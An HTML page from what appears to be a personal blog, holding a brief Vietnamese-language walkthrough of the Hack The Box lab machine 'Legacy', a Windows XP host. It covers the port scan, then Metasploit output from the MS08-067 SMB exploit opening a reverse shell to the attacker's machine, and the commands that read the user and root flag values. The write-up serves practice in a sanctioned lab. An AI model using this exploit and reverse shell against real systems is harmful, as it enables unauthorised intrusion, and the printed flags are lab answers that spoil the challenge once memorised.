

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Legacy HTB - Zoltán&#39;s Blog</title>
  <meta name="description" content="Legacy Machine về window easy:
135/tcpTrạng thái: OpenDịch vụ: Microsoft Windows RPCRPC (Remote Procedure Call) là một giao thức thường được sử dụng để thực thi chương trình trên máy tính từ xa. Có thể kiểm tra thêm để tìm lỗ hổng liên quan đến DCOM hoặc MSRPC.139/tcpTrạng thái: OpenDịch vụ: NetBIOS Session Service (netbios-ssn)Đây là một phần của giao thức NetBIOS, thường được sử dụng để chia sẻ tệp/tài nguyên.">
  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "Zoltán\u0027s Blog",
    
    "url": "https:\/\/bzoltan1.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/bzoltan1.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/bzoltan1.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-12-02-legacyhtb\/",
          "name": "Legacy htb"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "Legacy HTB",
  "description" : "Legacy Machine về window easy:\n135\/tcp\rTrạng thái: Open\rDịch vụ: Microsoft Windows RPC\rRPC (Remote Procedure Call) là một giao thức thường được sử dụng để thực thi chương trình trên máy tính từ xa. Có thể kiểm tra thêm để tìm lỗ hổng liên quan đến DCOM hoặc MSRPC.\r139\/tcp\rTrạng thái: Open\rDịch vụ: NetBIOS Session Service (netbios-ssn)\rĐây là một phần của giao thức NetBIOS, thường được sử dụng để chia sẻ tệp\/tài nguyên.",
  "inLanguage" : "en",
  "wordCount":  331 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese" ],
  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-12-02-legacyhtb\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/bzoltan1.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="Legacy HTB" />
<meta property="og:description" content="Legacy Machine về window easy:
135/tcpTrạng thái: OpenDịch vụ: Microsoft Windows RPCRPC (Remote Procedure Call) là một giao thức thường được sử dụng để thực thi chương trình trên máy tính từ xa. Có thể kiểm tra thêm để tìm lỗ hổng liên quan đến DCOM hoặc MSRPC.139/tcpTrạng thái: OpenDịch vụ: NetBIOS Session Service (netbios-ssn)Đây là một phần của giao thức NetBIOS, thường được sử dụng để chia sẻ tệp/tài nguyên.">
<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-12-02-legacyhtb/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="Zoltán&#39;s Blog" />

  <meta name="twitter:title" content="Legacy HTB" />
  <meta name="twitter:description" content="Legacy Machine về window easy:
135/tcpTrạng thái: OpenDịch vụ: Microsoft Windows RPCRPC (Remote Procedure Call) là một giao thức thường được sử dụng để thực thi chương trình trên máy tính từ xa. Có …">
  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
            </li>
          
        
          
            <li>
              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://bzoltan1.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="write-up-heading">
              
                <h1>Legacy HTB</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <h1 id="legacy">Legacy</h1>
<p><img src="https://hackmd.io/_uploads/SJa82-3XJl.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Sy0x6Zn7yg.png" alt="image"></p>
<p>Machine về window easy:</p>
<p><img src="https://hackmd.io/_uploads/r1EB0-hQkx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1UICW3Xye.png" alt="image"></p>
<pre><code>135/tcp

Trạng thái: Open
Dịch vụ: Microsoft Windows RPC
RPC (Remote Procedure Call) là một giao thức thường được sử dụng để thực thi chương trình trên máy tính từ xa. Có thể kiểm tra thêm để tìm lỗ hổng liên quan đến DCOM hoặc MSRPC.
139/tcp

Trạng thái: Open
Dịch vụ: NetBIOS Session Service (netbios-ssn)
Đây là một phần của giao thức NetBIOS, thường được sử dụng để chia sẻ tệp/tài nguyên. Có thể kiểm tra các chia sẻ không bảo mật hoặc lỗi SMB (Server Message Block).
445/tcp

Trạng thái: Open
Dịch vụ: Microsoft-ds (SMB)
SMB là giao thức phổ biến cho chia sẻ tệp và máy in trên mạng. Lưu ý:
SMB1 (phiên bản cũ) đang được sử dụng, thường dễ bị tấn công như EternalBlue hoặc các lỗ hổng tương tự.
Message Signing: Bị tắt (rủi ro bảo mật, dễ bị tấn công MITM).
</code></pre><p><a href="https://www.getastra.com/blog/security-audit/how-to-hack-windows-xp-using-metasploit-kali-linux-ms08067/">https://www.getastra.com/blog/security-audit/how-to-hack-windows-xp-using-metasploit-kali-linux-ms08067/</a></p>
<p>ta thấy rpc được mở có khả năng bị khai thác với <code>CVE-2008-4250</code>:</p>
<p><img src="https://hackmd.io/_uploads/HJkrEznQyl.png" alt="image"></p>
<pre><code>msf6 exploit(windows/smb/ms08_067_netapi) &gt; exploit

[*] Started reverse TCP handler on 10.10.14.45:4444
[*] 10.129.243.103:445 - Automatically detecting the target...
[*] 10.129.243.103:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.243.103:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.243.103:445 - Attempting to trigger the vulnerability...
[*] Command shell session 5 opened (10.10.14.45:4444 -&gt; 10.129.243.103:1036) at 2024-12-03 12:13:56 +0700


Shell Banner:
Microsoft Windows XP [Version 5.1.2600]
-----


C:\WINDOWS\system32&gt;cd &quot;C:\Documents and Settings\john\Desktop&quot;
cd &quot;C:\Documents and Settings\john\Desktop&quot;

C:\Documents and Settings\john\Desktop&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19 ��    &lt;DIR&gt;          .
16/03/2017  08:19 ��    &lt;DIR&gt;          ..
16/03/2017  08:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.296.608.768 bytes free

C:\Documents and Settings\john\Desktop&gt;type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
C:\Documents and Settings\john\Desktop&gt;cd &quot;C:\Documents and Settings\Administrator\Desktop&quot;
cd &quot;C:\Documents and Settings\Administrator\Desktop&quot;

C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop&gt;

</code></pre><h2 id="cheat">cheat</h2>
<p><code>cd &quot;C:\Documents and Settings\Administrator\Desktop&quot;</code></p>
<p><code>cd &quot;C:\Documents and Settings\john\Desktop&quot;</code></p>
<p><code>type file.txt</code> -&gt; read file</p>


        
          <div class="blog-tags">
            
              
              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://bzoltan1.github.io/write-up/2024-12-12-optimum/" data-toggle="tooltip" data-placement="top" title="Optimum HTB">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://bzoltan1.github.io/write-up/2024-12-02-lamehtb/" data-toggle="tooltip" data-placement="top" title="Lame HTB">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

